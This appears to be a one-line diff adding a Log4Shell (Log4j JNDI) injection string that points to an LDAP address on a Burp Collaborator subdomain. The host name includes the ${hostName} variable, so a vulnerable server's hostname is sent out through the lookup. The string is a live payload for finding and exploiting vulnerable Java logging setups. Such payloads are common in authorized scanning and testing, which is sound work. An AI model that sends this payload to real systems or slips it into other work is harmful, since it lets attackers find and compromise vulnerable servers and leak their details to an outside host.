@@ -1,0 +1,1 @@
+${jndi:ldap://h${hostName}.pngqmjz53fakh1p33eyw9jlyhpnlhh56.burpcollaborator.net:99999/s2test}
